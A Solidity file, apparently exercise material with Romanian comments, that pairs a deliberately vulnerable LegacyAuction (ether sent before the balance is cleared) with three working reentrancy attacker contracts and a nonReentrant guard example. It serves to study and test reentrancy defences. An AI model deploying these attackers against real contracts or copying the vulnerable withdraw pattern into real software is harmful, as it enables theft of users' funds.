// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {VulnerableAuction, SecureAuction} from "./Auction.sol";

contract LegacyAuction {
    mapping(address => uint256) public bids;
    address public highestBidder;
    uint256 public highestBid;
    bool public auctionEnded;

    function placeBid() external payable {
        require(!auctionEnded && msg.value > 0);
        bids[msg.sender] += msg.value;
        if (bids[msg.sender] > highestBid) {
            highestBidder = msg.sender;
            highestBid = bids[msg.sender];
        }
    }

    function endAuction() external {
        auctionEnded = true;
    }

    function withdraw() external {
        require(auctionEnded && msg.sender != highestBidder);
        uint256 amount = bids[msg.sender];
        require(amount > 0);
        (bool success,) = msg.sender.call{value: amount}("");
        bids[msg.sender] = 0;
        require(success);
    }
}

// 3.1: Re-intra cat timp exista suficient ether pentru un refund complet
contract ReentrantAttacker {
    LegacyAuction public auction;

    constructor(address auctionAddress) {
        auction = LegacyAuction(auctionAddress);
    }

    function bid() external payable {
        auction.placeBid{value: msg.value}();
    }

    function attack() external {
        auction.withdraw();
    }

    fallback() external payable {
        uint256 amount = auction.bids(address(this));
        if (amount > 0 && address(auction).balance >= amount) {
            auction.withdraw();
        }
    }
}

// 3.2: Re-intra in claimPrize, dar nu forteaza un apel care nu mai poate reusi
contract PrizeAttacker {
    VulnerableAuction public vulnerableAuction;
    SecureAuction public secureAuction;
    uint256 public bidAmount;

    constructor(address auctionAddress, bool secure) {
        if (secure) {
            secureAuction = SecureAuction(auctionAddress);
        } else {
            vulnerableAuction = VulnerableAuction(auctionAddress);
        }
    }

    function bid() external payable {
        bidAmount = msg.value;
        if (address(vulnerableAuction) != address(0)) {
            vulnerableAuction.placeBid{value: msg.value}();
        } else {
            secureAuction.placeBid{value: msg.value}();
        }
    }

    function attack() external {
        if (address(vulnerableAuction) != address(0)) {
            vulnerableAuction.claimPrize();
        } else {
            secureAuction.claimPrize();
        }
    }

    fallback() external payable {
        if (address(vulnerableAuction) != address(0) &&
            address(vulnerableAuction).balance >= bidAmount) {
            address(vulnerableAuction).call(abi.encodeWithSignature("claimPrize()"));
        }
    }
}

// 3.3: Re-intrarea intre withdraw si claimPrize foloseste acelasi guard
contract CrossFunctionAttacker {
    VulnerableAuction public auction;
    bool public reentryFailed;

    constructor(address auctionAddress) {
        auction = VulnerableAuction(auctionAddress);
    }

    function bid() external payable {
        auction.placeBid{value: msg.value}();
    }

    function attack() external {
        auction.withdraw();
    }

    fallback() external payable {
        (bool success,) = address(auction).call(abi.encodeWithSignature("claimPrize()"));
        reentryFailed = !success;
    }
}

contract StorageGuardAuction {
    bool private locked;
    mapping(address => uint256) public balances;

    modifier nonReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        balances[msg.sender] = 0;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
    }
}
